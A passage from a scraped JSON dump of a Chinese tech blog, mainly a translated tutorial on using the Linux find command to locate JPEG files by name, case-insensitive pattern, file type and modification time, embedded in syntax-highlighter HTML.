class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ man shuf\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f99815994721-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f99815994721-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f99815994721-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">man </span><span class=\"crayon-i\">shuf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f99815994721-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>今天就是这些。还有更多更好的东西。敬请关注！</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113985\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113985votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113985\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113985/", "url_obj_id": "6dc6e928199fafa86ce672b2bf1253e2"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "如何在 Linux 中使用 find", "create_date": "2018/05/17 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/4/how-use-find-linux\">Ben Cotton</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9648-1.html\">Linux中国/geekpi</a>   </div><p>在<a href=\"https://linux.cn/article-9585-1.html\">最近的一篇文章</a>中，Lewis Cowles 介绍了 <code>find</code> 命令。</p>\n<p><code>find</code> 是日常工具箱中功能更强大、更灵活的命令行工具之一，因此值得花费更多的时间。</p>\n<p>最简单的，<code>find</code> 跟上路径寻找一些东西。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384b6648532091\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384b6648532091-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384b6648532091-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384b6648532091-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384b6648532091-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>它将找到（并打印出）系统中的每个文件。而且由于一切都是文件，你会得到很多需要整理的输出。这可能不能帮助你找到你要找的东西。你可以改变路径参数来缩小范围，但它不会比使用 <code>ls</code> 命令更有帮助。所以你需要考虑你想要找的东西。</p>\n<p>也许你想在主目录中找到所有的 JPEG 文件。 <code>-name</code> 参数允许你将结果限制为与给定模式匹配的文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384bf215513713\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -name '*jpg'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384bf215513713-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384bf215513713-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384bf215513713-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384bf215513713-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>可是等等！如果它们中的一些是大写的扩展名会怎么样？<code>-iname</code> 就像 <code>-name</code>，但是不区分大小写。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384c3981780255\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -iname '*jpg'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384c3981780255-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384c3981780255-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384c3981780255-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384c3981780255-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>很好！但是 8.3 名称方案是如此的老。一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 <code>-o</code>）来组合。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384c7772090122\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ ( -iname 'jpeg' -o -iname 'jpg' )\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384c7772090122-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384c7772090122-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384c7772090122-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384c7772090122-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们正在接近目标。但是如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 <code>bucketofjpg</code> 而不是 <code>pictures</code> 的目录就超出了本文的范围。）我们使用 <code>-type</code> 参数修改我们的命令来查找文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384ca077656208\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type f\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384ca077656208-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384ca077656208-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384ca077656208-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384ca077656208-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>或者，也许你想找到那些命名奇怪的目录，以便稍后重命名它们：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384ce648909794\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type d\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384ce648909794-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384ce648909794-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384ce648909794-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930384ce648909794-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>你最近拍了很多照片，所以让我们把它缩小到上周更改的文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930384d1765688740\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type f -mtime -7\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930384d1765688740-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930384d1765688740-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930384d1765688740-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span 